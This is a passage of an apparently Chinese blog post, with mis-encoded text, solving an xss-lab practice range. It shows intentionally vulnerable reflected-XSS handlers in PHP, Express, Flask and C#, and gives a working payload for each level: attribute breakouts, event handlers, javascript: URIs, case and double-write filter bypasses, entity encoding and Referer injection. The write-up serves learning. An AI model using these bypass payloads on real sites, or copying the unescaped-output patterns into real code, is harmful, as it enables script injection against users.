code</h2><p>ä¸€ä¸ªç®€å•çš„åå°„å‹XSSæ¼æ´æ˜¯å½“<strong>ç”¨æˆ·æœç´¢æŸä¸ªæœ¯è¯­</strong>æ—¶ï¼Œ<strong>æœç´¢å­—ç¬¦ä¸²ä¼šé€å­—åŒ…å«åœ¨ç»“æœé¡µé¢ä¸­</strong>ã€‚è¿™ç§ç®€å•çš„æƒ…å†µä¸ºæ”»å‡»è€…æä¾›äº†ä¸€ä¸ªå®¹æ˜“åˆ©ç”¨çš„ç›®æ ‡ã€‚</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$search_query</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You searched for: <span class="subst">$search_query</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> searchTerm = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;You searched for: &#x27;</span> + searchTerm);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br></pre></td></tr></table></figure><h3 id="Pythonï¼ˆFlaskï¼‰"><a href="#Pythonï¼ˆFlaskï¼‰" class="headerlink" title="Pythonï¼ˆFlaskï¼‰"></a>Pythonï¼ˆFlaskï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;You searched for: <span class="subst">&#123;query&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> userInput = Request.QueryString[<span class="string">&quot;q&quot;</span>];</span><br><span class="line">    Response.Write(<span class="string">&quot;User Input: &quot;</span> + userInput);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>ç›´æ¥è¾“å…¥<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>å°±å¯ä»¥å‘ç°æ²¡è¢«è¿‡æ»¤ç›´æ¥æˆåŠŸ</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>ç…§å¸¸è¾“å…¥<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>F12å‘ç°è¢«è½¬ä¹‰æˆ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;script&amp;gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>);&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¾€ä¸‹çœ‹ä¼šå‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>åœ¨valueä¸­æ²¡è¢«è½¬ä¹‰ï¼Œå› æ­¤å¯ä»¥æ„é€ </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;script&gt;<span class="built_in">alert</span>(<span class="number">1</span>);&lt;/script&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å³è¾“å…¥ <code>?name=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;&quot;</code></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>è¿™ä¸€é¢˜æ¶‰åŠä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p>åœ¨ 8.1.0 åŠä»¥ä¸Šçš„ PHP ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªå‡½æ•°é»˜è®¤ä¼šè½¬ä¹‰ <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&amp;</code>ã€<code>&#39;</code>ã€<code>&quot;</code> è¿™äº”ä¸ªå­—ç¬¦ï¼ŒåŸºæœ¬å¯ä»¥é˜²èŒƒè¿™é‡Œçš„ XSS æ”»å‡»ã€‚<br>ä½†æ˜¯ï¼Œ8.1.0 ä»¥ä¸‹ç‰ˆæœ¬çš„ PHP é»˜è®¤åªä¼šè½¬ä¹‰ <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&amp;</code>ã€<code>&quot;</code> è¿™å››ä¸ªå­—ç¬¦ï¼Œä¸ä¼šè½¬ä¹‰å•å¼•å· <code>&#39;</code>ã€‚è¿™å°±ç»™è¿™ä¸ªå‡½æ•°å¸¦æ¥äº†å·¨å¤§çš„å®‰å…¨éšæ‚£ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¢æµ‹è¯­å¥æ¥çœ‹åˆ°è¿™ä¸€ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">()</span><br><span class="line">&lt; &gt;</span><br><span class="line">&lt;script&gt; &lt;/script&gt;</span><br><span class="line">&lt;Script&gt; &lt;/Script&gt;</span><br><span class="line">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt;</span><br><span class="line">Onerror</span><br><span class="line">onerror</span><br><span class="line">javascript:</span><br><span class="line">JavaScript:</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line">eval()</span><br><span class="line">&lt;a&gt;</span><br><span class="line">&lt;img&gt;</span><br><span class="line">&lt;iframe&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">src</span><br><span class="line">&#123;&#125;</span><br><span class="line">/</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>æ‰“è¿›å»çœ‹è§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;   //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&quot;   //è½¬è¯‘æˆ&amp;quot;</span></span><br><span class="line"><span class="string">()  //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&lt; &gt; //&amp;lt; &amp;gt;</span></span><br><span class="line"><span class="string">&lt;script&gt; &lt;/script&gt; //&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt;</span></span><br><span class="line"><span class="string">&lt;Script&gt; &lt;/Script&gt; //&amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt;</span></span><br><span class="line"><span class="string">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; //&amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt;</span></span><br><span class="line"><span class="string">Onerror //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">onerror //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">javascript: //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">JavaScript: //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&lt;!-- --&gt; //&amp;lt;!-- --&amp;gt;</span></span><br><span class="line"><span class="string">eval() //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&lt;a&gt; //&amp;lt;a&amp;gt;</span></span><br><span class="line"><span class="string">&lt;img&gt; //&amp;lt;img&amp;gt;</span></span><br><span class="line"><span class="string">&lt;iframe&gt; //&amp;lt;ifname&amp;gt;</span></span><br><span class="line"><span class="string">&lt;form&gt; //&amp;lt;form&amp;gt;</span></span><br><span class="line"><span class="string">src //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&#123;&#125; //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">/ //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">+ //æœªè¢«è½¬ä¹‰</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰è¢«è¿‡æ»¤å•å¼•å·ï¼Œç„¶åå‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>valueæ˜¯é€šè¿‡å•å¼•å·æ¥é—­åˆçš„ï¼Œå› æ­¤å¯ä»¥æå‰é—­åˆvalueï¼Œä½†æ˜¯æ²¡æœ‰&lt;&gt;å°±æ— æ³•é—­åˆæ ‡ç­¾ï¼Œè€ƒè™‘ä½¿ç”¨è§¦å‘å™¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;&#x27; onblur=&#x27;</span><span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p><code>?name=&#39; onblur=&#39;alert(1)</code></p><p>inputæ²¡æœ‰onerrorï¼Œè€Œonbluræ˜¯å¤±å»ç„¦ç‚¹è§¦å‘ï¼Œå› æ­¤æœç´¢æ¡†éšä¾¿è¾“ç‚¹ä¸œè¥¿ä¹‹åç‚¹å…¶ä»–åœ°æ–¹å°±æˆåŠŸè§¦å‘</p><p>æ³¨æ„ï¼šç©ºæ ¼</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; ()   script /script Script /Script scrscriptipt SCRscriptIPT Onerror onerror javascript: JavaScript: !-- -- eval() a img iframe form src &#123;&#125; / +&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°valueçš„åŒå¼•å·æœªè¢«è¿‡æ»¤ä¸”åŒå¼•å·é—­åˆï¼Œå› æ­¤ç±»ä¼¼level3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onblur=&quot;</span><span class="built_in">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;scrscriptipt&amp;gt; onerror onerror javascript: javascript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;scrscriptipt&gt; &lt;scrscriptipt&gt; o_nerror o_nerror javascript: javascript: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; src &#123;&#125; / +&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°&lt;&gt;å’Œjavascriptæœªè¢«è¿‡æ»¤ï¼Œä½†æ˜¯scriptå’Œonè¢«è½¬ä¹‰æˆscr_iptå’Œo_n</p><blockquote><p><a> æ ‡ç­¾æ˜¯ HTML ä¸­çš„é”šç‚¹å…ƒç´ ï¼Œä¸»è¦ç”¨äºåˆ›å»ºé“¾æ¥ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æ‰§è¡Œjs</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a href=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;hack&lt;/a&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>è¾“å…¥ <code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;hack&lt;/a&gt;&lt;&quot;</code>æˆåŠŸhack</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;Script&gt; &lt;/Script&gt; &lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; Onerror o_nerror javascript: JavaScript: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; sr_c &#123;&#125; / +&quot;</span>&gt;    </span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a hr_ef=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;hack&lt;/a&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>hrefè¢«è½¬ä¹‰æ‰äº†ï¼Œä½†æ˜¯çœ‹ä¸Šé¢çš„å°è¯•ï¼Œä¼šå‘ç°å¤§å†™å¯ç”¨ï¼Œå°è¯•å¤§å†™hREFæˆåŠŸ</p><blockquote><p>HTMLå¤§å°å†™ä¸æ•æ„Ÿ</p></blockquote><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;scrscriptipt&amp;gt; onerror onerror javascript: javascript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;&gt; &lt;/&gt; &lt;&gt; &lt;/&gt; &lt;script&gt; &lt;script&gt; error error java: java: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt;  &#123;&#125; / +&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°scriptå’Œonéƒ½ä¼šè¢«è¿‡æ»¤æ‰ï¼Œä½†æ˜¯åªè¿‡æ»¤äº†ä¸€æ¬¡ï¼Œå› æ­¤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;scrscriptipt&gt;<span class="built_in">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><code>&quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;&lt;&quot;</code></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>å‘ç°è¾“å…¥çš„å€¼è¢«æ‹¼æ¥åˆ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">&quot;11&quot;</span>&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>hrefåï¼Œä½†æ˜¯JavaScriptè¢«è½¬ä¹‰äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">&quot;&#x27; &amp;quot () &lt; &gt; &lt;scr_ipt&gt; &lt;/scr_ipt&gt; &lt;scr_ipt&gt; &lt;/scr_ipt&gt; &lt;scrscr_iptipt&gt; &lt;scrscr_iptipt&gt; o_nerror o_nerror javascr_ipt: javascr_ipt: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; sr_c &#123;&#125; / +&quot;</span>&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¦ç”¨åˆ° href å±æ€§çš„ä¸€ä¸ªç‰¹æ€§ï¼šhref ä¼ å…¥çš„ URI ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ HTML å­—ç¬¦å®ä½“ã€‚åœ¨æ‰“å¼€é“¾æ¥æ—¶ï¼Œå­—ç¬¦å®ä½“ä¹Ÿä¼šè¢«è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="built_in">alert</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>ä¼šæ£€æµ‹http:&#x2F;&#x2F;</p><p>å› æ­¤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:<span class="built_in">alert</span>(<span class="number">1</span>);<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/xss-levels/level10.php?keyword=test&amp;t_link=tlink&amp;t_history=thist&amp;t_sort=tsort</span></span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level10&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œtestç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;tsort&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å˜æˆè¿™æ ·ï¼Œå› æ­¤t_sortæ˜¯æœ‰å€¼çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&#x27; &quot;</span> ()   script /script Script /Script scrscriptipt SCRscriptIPT Onerror onerror javascript: JavaScript: !-- -- <span class="built_in">eval</span>() a img iframe form src &#123;&#125; /  <span class="string">&quot; type=&quot;</span>hidden<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>åªè¿‡æ»¤æ‰äº†&lt;&gt;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&quot;</span> onmouseover=javascript:<span class="built_in">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onmouseover=javascript:alert(1) type=&quot;</span></span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>å‘ç°å­˜åœ¨refererå­—æ®µ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ref&quot;</span>  value=<span class="string">&quot;http://localhost/xss-levels/level10.php?keyword=&amp;t_sort=%22%20onmouseover=javascript:alert(1)%20type=%22&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>BPæŠ“åŒ…</p><p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250123115706229.png" alt="image-20250123115706229"></p><p>è®²Referreræ”¹ä¸ºâ€ onmouseover&#x3D;javascript:alert(1) type&#x3D;â€é€šè¿‡ï¼ŒæˆåŠŸ</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_ua&quot;</span>  value=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img 